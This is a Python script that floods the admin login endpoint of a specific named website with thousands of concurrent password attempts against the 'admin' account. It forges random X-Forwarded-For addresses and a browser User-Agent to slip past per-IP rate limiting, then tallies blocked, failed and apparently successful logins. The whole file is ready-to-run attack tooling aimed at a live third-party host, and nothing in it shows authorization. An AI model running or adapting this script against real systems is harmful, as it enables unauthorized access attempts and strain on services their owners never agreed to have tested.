import json, random, sys, urllib.request, urllib.error, time
from collections import Counter

TARGET = "https://www.kufaka.com/adminApi/auth/login"
N = int(sys.argv[1]) if len(sys.argv) > 1 else 3000
CONC = int(sys.argv[2]) if len(sys.argv) > 2 else 20
USER = sys.argv[3] if len(sys.argv) > 3 else "admin"

def rand_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))

def one(i):
    body = json.dumps({"username": USER, "password": "Zx%d!q%s" % (random.randint(0, 10**9), i)}).encode()
    req = urllib.request.Request(TARGET, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Forwarded-For", rand_ip())
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        r = urllib.request.urlopen(req, timeout=20)
        txt = r.read().decode("utf-8", "ignore")
        return (r.status, txt[:200])
    except urllib.error.HTTPError as e:
        return (e.code, e.read().decode("utf-8", "ignore")[:160])
    except Exception as e:
        return (0, "ERR:%s" % type(e).__name__)

t0 = time.time()
c = Counter()
samples = {}
with __import__("concurrent.futures").futures.ThreadPoolExecutor(max_workers=CONC) as ex:
    for st, txt in ex.map(one, range(N)):
        if st in (403, 429):
            key = str(st)
        elif "用户名或密码不正确" in txt:
            key = "MISS"
        elif st == 200:
            key = "SUCCESS?"
        else:
            key = str(st)
        c[key] += 1
        samples.setdefault(key, txt[:150])
        if key == "SUCCESS?":
            print("HIT", txt)
print("done", N, "in %.1fs" % (time.time() - t0), dict(c))
for k, v in samples.items():
    print(k, "->", v)
